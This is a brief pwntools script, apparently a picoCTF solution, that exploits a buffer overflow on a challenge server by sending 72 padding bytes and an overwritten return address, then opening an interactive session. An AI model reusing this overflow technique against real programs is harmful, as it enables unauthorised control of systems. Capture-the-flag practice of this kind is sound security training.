from pwn import *

r = remote("saturn.picoctf.net" , 63637)
# file = "/mnt/c/Users/anton/Downloads/111"
# r = process(file)


payload = b'a'*72 + p64(0x0040123b)

r.recvline()
r.sendline(payload)

r.interactive()
